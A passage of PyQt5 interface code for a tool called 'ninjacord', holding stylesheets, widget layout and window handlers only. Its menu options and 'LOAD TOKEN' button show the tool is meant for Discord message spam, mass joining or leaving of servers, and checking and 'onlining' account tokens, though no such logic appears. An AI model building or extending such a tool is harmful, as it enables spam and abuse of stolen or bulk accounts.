"QSlider::groove:horizontal {\n"
"    height: 5px;\n"
"    background: #23dae9;\n"
"}\n"
"QSlider::groove:vertical {\n"
"    width: 5px;\n"
"    background: #23dae9;\n"
"}\n"
"QSlider::handle:horizontal {\n"
"    background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #b4b4b4, stop:1 #8f8f8f);\n"
"    border: 1px solid #5c5c5c;\n"
"    width: 14px;\n"
"    margin: -5px 0;\n"
"    border-radius: 7px;\n"
"}\n"
"QSlider::handle:vertical {\n"
"    background: qlineargradient(x1:1, y1:1, x2:0, y2:0, stop:0 #b4b4b4, stop:1 #8f8f8f);\n"
"    border: 1px solid #5c5c5c;\n"
"    height: 14px;\n"
"    margin: 0 -5px;\n"
"    border-radius: 7px;\n"
"}\n"
"QSlider::add-page:horizontal {\n"
"    background: white;\n"
"}\n"
"QSlider::add-page:vertical {\n"
"    background: white;\n"
"}\n"
"QSlider::sub-page:horizontal {\n"
"    background: #23dae9;\n"
"}\n"
"QSlider::sub-page:vertical {\n"
"    background: #23dae9;\n"
"}")
        self.centralwidget = QtWidgets.QWidget()
        self.centralwidget.setObjectName("centralwidget")
        self.back_to_menu_button = QtWidgets.QPushButton(self.centralwidget)
        self.back_to_menu_button.setGeometry(QtCore.QRect(10, 10, 31, 31))
        font = QtGui.QFont()
        font.setPointSize(15)
        self.back_to_menu_button.setFont(font)
        self.back_to_menu_button.setStyleSheet("QPushButton{\n"
"  border-style: solid;\n"
"  border-style: solid;\n"
"  color: #a9b7c6;\n"
"  padding: 2px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton::default{\n"
"  border-style: inset;\n"
"  border-width: 1px;\n"
"  color: #a9b7c6;\n"
"  padding: 2px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton:hover{\n"
"  border-style: solid;\n"
"  border-top-color: #23dae9;\n"
"  border-right-color: #23dae9;\n"
"  border-left-color: #23dae9;\n"
"  border-bottom-color: #23dae9;\n"
"  border-bottom-width: 1px;\n"
"  border-style: solid;\n"
"  color: #23dae9;\n"
"  padding-bottom: 2px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton:pressed{\n"
"  border-style: solid;\n"
"  border-top-color: #23dae9;\n"
"  border-right-color: #23dae9;\n"
"  border-left-color: #23dae9;\n"
"  border-bottom-color: #23dae9;\n"
"  border-bottom-width: 2px;\n"
"  border-style: solid;\n"
"  color: #23dae9;\n"
"  padding-bottom: 1px;\n"
"  background-color: #1e1d23;\n"
"}\n"
"QPushButton:disabled{\n"
"  border-style: solid;\n"
"  border-top-color: #23dae9;\n"
"  border-right-color: #23dae9;\n"
"  border-left-color: #23dae9;\n"
"  border-bottom-color: #808086;\n"
"  border-bottom-width: 2px;\n"
"  border-style: solid;\n"
"  color: #808086;\n"
"  padding-bottom: 1px;\n"
"  background-color: #1e1d23;\n"
"}")
        self.back_to_menu_button.setObjectName("back_to_menu_button")
        self.buyult = QtWidgets.QRadioButton(self.centralwidget)
        self.buyult.setGeometry(QtCore.QRect(1230, 10, 16, 17))
        self.buyult.setStyleSheet("QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(0, 255, 0);\n"
"    color: rgb(0, 255, 0);\n"
"    background-color: rgb(0, 255, 0);\n"
"}\n"
"\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(0, 255, 0);\n"
"    color: rgb(0, 255, 0);\n"
"    background-color: rgb(0, 255, 0);\n"
"}")
        self.buyult.setText("")
        self.buyult.setObjectName("buyult")
        self.kucult = QtWidgets.QRadioButton(self.centralwidget)
        self.kucult.setGeometry(QtCore.QRect(1210, 10, 16, 17))
        self.kucult.setStyleSheet("QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color:  rgb(255, 255, 0);\n"
"    color:  rgb(255, 255, 0);\n"
"    background-color: rgb(255, 255, 0);\n"
"}\n"
"\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color:  rgb(255, 255, 0);\n"
"    color:  rgb(255, 255, 0);\n"
"    background-color:  rgb(255, 255, 0);\n"
"}")
        self.kucult.setText("")
        self.kucult.setObjectName("kucult")
        self.kapat = QtWidgets.QRadioButton(self.centralwidget)
        self.kapat.setGeometry(QtCore.QRect(1250, 10, 16, 17))
        self.kapat.setStyleSheet("QRadioButton::indicator:checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(208, 0, 0);\n"
"    color: rgb(208, 0, 0);\n"
"    background-color: rgb(208, 0, 0);\n"
"}\n"
"\n"
"QRadioButton::indicator:!checked {\n"
"    height: 10px;\n"
"    width: 10px;\n"
"    border-style:solid;\n"
"    border-radius:5px;\n"
"    border-width: 1px;\n"
"    border-color: rgb(208, 0, 0);\n"
"    color: rgb(208, 0, 0);\n"
"    background-color: rgb(208, 0, 0);\n"
"}")
        
        self.kapat.setText("")
        self.kapat.setObjectName("kapat")
        self.panel = QtWidgets.QGroupBox(self.centralwidget)
        self.panel.setGeometry(QtCore.QRect(20, 60, 281, 621))
        self.panel.setTitle("")
        self.panel.setObjectName("panel")
        self.startbutton = QtWidgets.QPushButton(self.panel)
        self.startbutton.setGeometry(QtCore.QRect(40, 20, 201, 41))
        self.startbutton.setStyleSheet("\n"
"border-radius: 15px;\n"
"background-color:rgb(0, 85, 0)")
        self.startbutton.setObjectName("startbutton")
        self.inputbutton = QtWidgets.QPushButton(self.panel)
        self.inputbutton.setGeometry(QtCore.QRect(40, 70, 201, 41))
        self.inputbutton.setStyleSheet("\n"
"border-radius: 15px;\n"
"background-color:rgb(170, 0, 0)")
        self.inputbutton.setObjectName("inputbutton")
        self.loadbutton = QtWidgets.QPushButton(self.panel)
        self.loadbutton.setGeometry(QtCore.QRect(40, 120, 201, 41))
        self.loadbutton.setStyleSheet("\n"
"border-radius: 15px;\n"
"background-color:rgb(0, 85, 127)")
        self.loadbutton.setObjectName("loadbutton")
        self.selectcord = QtWidgets.QComboBox(self.panel)
        self.selectcord.setGeometry(QtCore.QRect(80, 250, 161, 22))
        self.selectcord.setObjectName("selectcord")
        self.selectcord.addItem("")
        self.selectcord.setItemText(0, "")
        self.selectcord.addItem("")
        self.selectcord.addItem("")
        self.selectcord.addItem("")
        self.selectcord.addItem("")
        self.selectcord.addItem("")        
        self.playingname = QtWidgets.QLineEdit(self.panel)
        self.playingname.setGeometry(QtCore.QRect(90, 180, 161, 22))
        self.playingname.setObjectName("playingname")
        self.label_6 = QtWidgets.QLabel(self.panel)
        self.label_6.setGeometry(QtCore.QRect(12, 180, 71, 20))
        self.label_6.setObjectName("label_6")
        self.label_7 = QtWidgets.QLabel(self.panel)
        self.label_7.setGeometry(QtCore.QRect(12, 240, 71, 20))
        self.label_7.setObjectName("label_7")
        self.twitchurl = QtWidgets.QLineEdit(self.panel)
        self.twitchurl.setGeometry(QtCore.QRect(90, 240, 161, 22))
        self.twitchurl.setObjectName("twitchurl")
        self.label_4 = QtWidgets.QLabel(self.panel)
        self.label_4.setGeometry(QtCore.QRect(26, 240, 71, 20))
        self.label_4.setObjectName("label_4")
        self.setstatus = QtWidgets.QComboBox(self.panel)
        self.setstatus.setGeometry(QtCore.QRect(90, 240, 161, 22))
        self.setstatus.setObjectName("setstatus")
        self.setstatus.addItem("")
        self.setstatus.setItemText(0, "")
        self.setstatus.addItem("")
        self.setstatus.addItem("")
        self.setstatus.addItem("")
        self.label_5 = QtWidgets.QLabel(self.panel)
        self.label_5.setGeometry(QtCore.QRect(15, 210, 71, 20))
        self.label_5.setObjectName("label_5")
        self.playingtype = QtWidgets.QComboBox(self.panel)
        self.playingtype.setEnabled(True)
        self.playingtype.setGeometry(QtCore.QRect(90, 210, 161, 22))
        self.playingtype.setStatusTip("")
        self.playingtype.setCurrentIndex(0)
        self.playingtype.setObjectName("playingtype")
        self.playingtype.addItem("")
        self.playingtype.setItemText(0, "")
        self.playingtype.addItem("")
        self.playingtype.addItem("")
        self.playingtype.addItem("")
        self.playingtype.addItem("")
        self.spinBox = QtWidgets.QSpinBox(self.panel)
        self.spinBox.setGeometry(QtCore.QRect(80, 240, 161, 22))
        self.spinBox.setMouseTracking(False)
        self.spinBox.setFocusPolicy(QtCore.Qt.StrongFocus)
        self.spinBox.setAcceptDrops(True)
        self.spinBox.setMaximum(60)
        self.spinBox.setObjectName("spinBox")
        self.label_8 = QtWidgets.QLabel(self.panel)
        self.label_8.setGeometry(QtCore.QRect(28, 240, 61, 20))
        self.label_8.setObjectName("label_8")
        self.serverid = QtWidgets.QLineEdit(self.panel)
        self.serverid.setGeometry(QtCore.QRect(80, 180, 161, 20))
        self.serverid.setObjectName("serverid")
        self.channelid = QtWidgets.QLineEdit(self.panel)
        self.channelid.setGeometry(QtCore.QRect(80, 180, 161, 20))
        self.channelid.setObjectName("channelid")
        self.messageid = QtWidgets.QLineEdit(self.panel)
        self.messageid.setGeometry(QtCore.QRect(80, 210, 161, 20))
        self.messageid.setObjectName("messageid")
        self.label = QtWidgets.QLabel(self.panel)
        self.label.setGeometry(QtCore.QRect(20, 180, 61, 20))
        self.label.setObjectName("label")
        self.label_9 = QtWidgets.QLabel(self.panel)
        self.label_9.setGeometry(QtCore.QRect(13, 180, 61, 20))
        self.label_9.setObjectName("label_9")
        self.label_2 = QtWidgets.QLabel(self.panel)
        self.label_2.setGeometry(QtCore.QRect(24, 210, 61, 20))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.panel)
        self.label_3.setGeometry(QtCore.QRect(30, 250, 61, 20))
        self.label_3.setObjectName("label_3")
        #self.logo = QtWidgets.QLabel(self.panel)
        #self.logo.setGeometry(QtCore.QRect(20, 550, 241, 241))
        #self.logo.setStyleSheet("")
        #self.logo.setText("")
        #self.logo.setPixmap(self.show_image(self.encoded_data[0]))
        #self.logo.setScaledContents(True)
        #self.logo.setObjectName("logo")
        self.tablo2 = QtWidgets.QTableWidget(self.centralwidget)
        self.tablo2.setGeometry(QtCore.QRect(810, 60, 451, 621))
        self.tablo2.setObjectName("tablo2")
        self.tablo2.setColumnCount(1)
        self.tablo2.setRowCount(0)
        self.tablo2.setHorizontalHeaderLabels(['Console Log'])
        self.tablo2.horizontalHeader().setStretchLastSection(True)
        self.tablo2.setStyleSheet("QHeaderView::section  {\n"
"    background-color: #3A3939;\n"
"    color: silver;\n"
"    padding: 4px;\n"
"    border: 1px solid #6c6c6c;\n"
"    border-radius: 0px;\n"
"    text-align: center;\n"
"}\n"
"QTableView\n"
"{\n"
"    border: 1px solid #444;\n"
"    gridline-color: #6c6c6c;\n"
"    background-color: #201F1F;\n"
"}\n"
"\n"
"\n"
"QTableView, QHeaderView\n"
"{\n"
"    border-radius: 0px;\n"
"    color:rgb(0, 255, 255)\n"
"}\n"
"\n"
"QTableView::item:pressed, QListView::item:pressed, QTreeView::item:pressed  {\n"
"    background: #78879b;\n"
"    color: #FFFFFF;\n"
"}\n"
"\n"
"QTableView::item:selected:active, QTreeView::item:selected:active, QListView::item:selected:active  {\n"
"    background: #3d8ec9;\n"
"    color: #FFFFFF;\n"
"}\n"
"QTableCornerButton::section {\n"
"    background-color: #3A3939;\n"
"    border: 1px solid #3A3939;\n"
"    border-radius: 2px;\n"
"}")                
        self.tablo1 = QtWidgets.QTableWidget(self.centralwidget)
        self.tablo1.setGeometry(QtCore.QRect(320, 60, 451, 621))
        self.tablo1.setObjectName("tablo1")
        self.tablo1.setColumnCount(1)
        self.tablo1.setRowCount(0)
        self.tablo1.setHorizontalHeaderLabels(['Tools Log'])
        self.tablo1.horizontalHeader().setStretchLastSection(True)
        self.tablo1.setStyleSheet("QHeaderView::section  {\n"
"    background-color: #3A3939;\n"
"    color: silver;\n"
"    padding: 4px;\n"
"    border: 1px solid #6c6c6c;\n"
"    border-radius: 0px;\n"
"    text-align: center;\n"
"}\n"
"QTableView\n"
"{\n"
"    border: 1px solid #444;\n"
"    gridline-color: #6c6c6c;\n"
"    background-color: #201F1F;\n"
"}\n"
"\n"
"\n"
"QTableView, QHeaderView\n"
"{\n"
"    border-radius: 0px;\n"
"    color:rgb(0, 255, 255)\n"
"}\n"
"\n"
"QTableView::item:pressed, QListView::item:pressed, QTreeView::item:pressed  {\n"
"    background: #78879b;\n"
"    color: #FFFFFF;\n"
"}\n"
"\n"
"QTableView::item:selected:active, QTreeView::item:selected:active, QListView::item:selected:active  {\n"
"    background: #3d8ec9;\n"
"    color: #FFFFFF;\n"
"}\n"
"QTableCornerButton::section {\n"
"    background-color: #3A3939;\n"
"    border: 1px solid #3A3939;\n"
"    border-radius: 2px;\n"
"}")                
        self.setCentralWidget(self.centralwidget)

        self.loadbutton.clicked.connect(self.loadtoken)
        self.startbutton.clicked.connect(self.calistir)
        self.inputbutton.clicked.connect(self.durdur)

        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)


        self.kapat.clicked.connect(self.sayfakapat)
        self.kucult.clicked.connect(self.sayfakuluct)
        self.back_to_menu_button.clicked.connect(self.back)

    def retranslateUi(self):
        _translate = QtCore.QCoreApplication.translate
        self.setWindowTitle(_translate("ninjacord", "MainWindow"))
        self.back_to_menu_button.setText(_translate("ninjacord", ""))
        self.startbutton.setText(_translate("ninjacord", "START"))
        self.inputbutton.setText(_translate("ninjacord", "STOP"))
        self.loadbutton.setText(_translate("ninjacord", "LOAD TOKEN"))
        self.selectcord.setItemText(1, _translate("ninjacord", "MESSAGE SPAM"))
        self.selectcord.setItemText(2, _translate("ninjacord", "SERVER JOINER [ NOT WORK ]"))
        self.selectcord.setItemText(3, _translate("ninjacord", "SERVER LEAVER"))
        self.selectcord.setItemText(4, _translate("ninjacord", "TOKEN CHECKER"))
        self.selectcord.setItemText(5, _translate("ninjacord", "TOKEN ONLINER"))
        self.label.setText(_translate("ninjacord", "Server ID :"))
        self.label_9.setText(_translate("ninjacord", "Channel ID :"))
        self.label_2.setText(_translate("ninjacord", "Message :"))
        self.label_3.setText(_translate("ninjacord", "Method :"))
        self.label_6.setText(_translate("ninjacord", "Playing Name :"))
        self.label_3.setText(_translate("ninjacord", "Method :"))
        self.label_4.setText(_translate("ninjacord", "Set Status : "))
        self.label_7.setText(_translate("ninjacord", "     Twith URL : "))
        self.setstatus.setItemText(1, _translate("ninjacord", "ONLINE"))
        self.setstatus.setItemText(2, _translate("ninjacord", "IDLE"))
        self.setstatus.setItemText(3, _translate("ninjacord", "DND"))
        self.label_5.setText(_translate("ninjacord", "Playing Type : "))
        self.label_8.setText(_translate("ninjacord", "Timeout : "))
        self.playingtype.setItemText(1, _translate("ninjacord", "PLAYING"))
        self.playingtype.setItemText(2, _translate("ninjacord", "STREAMING"))
        self.playingtype.setItemText(3, _translate("ninjacord", "WATCHING"))
        self.playingtype.setItemText(4, _translate("ninjacord", "LISTENING"))


    def mousePressEvent(self, event):
        try:
            self.oldPos = event.globalPos()
        except:
            pass

    def mouseMoveEvent(self, event):
        try:
            delta = QPoint(event.globalPos() - self.oldPos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.oldPos = event.globalPos()
        except:
            pass
        
    def show_image(self, encoded_data):
        decoded_data = base64.b64decode(encoded_data)
        pixmap = QtGui.QPixmap()
        pixmap.loadFromData(decoded_data)
        return pixmap        

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    ui = Ui_ninjacord()
    ui.show()
    sys.exit(app.exec_())